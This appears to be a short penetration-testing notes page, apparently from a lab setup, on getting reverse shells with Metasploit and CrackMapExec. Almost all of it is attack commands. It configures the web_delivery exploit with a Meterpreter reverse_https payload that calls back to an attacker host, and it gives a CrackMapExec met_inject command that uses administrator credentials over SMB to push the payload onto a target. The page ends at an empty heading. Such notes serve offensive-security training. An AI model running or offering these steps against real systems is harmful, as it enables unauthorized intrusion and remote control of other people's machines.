---
description: Exploring Reverse Shells with Metasploit and CrackMapExec
cover: ../.gitbook/assets/GitBook Covers (1).png
coverY: 0
---

# 🟢 CME Reverse Shell with Metasploit

### Exploit

```
exploit/multi/script/web_delivery
```

```
set SRVHOST 192.168.1.201
set SRVPORT 8443
set exitonsession false
set SSL true
```

### Payload

```
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.201
set LPORT 443
set LURI rfs
```

### Define Target

```
set target 2
```

### Run Web Shell

```
exploit -j
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### CrackMapExec MSF reverse Shell - met\_inject

{% code overflow="wrap" %}
```bash
crackmapexec smb 192.168.1.119 -u 'Administrator' -p 'Password!' -d dc.deathstar.rfs  -M met_inject -o SRVHOST=192.168.1.201 SRVPORT=9443 RAND=J3PR0Jn6smfPvr SSL=https
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### MSF RPC + CrackMapExec

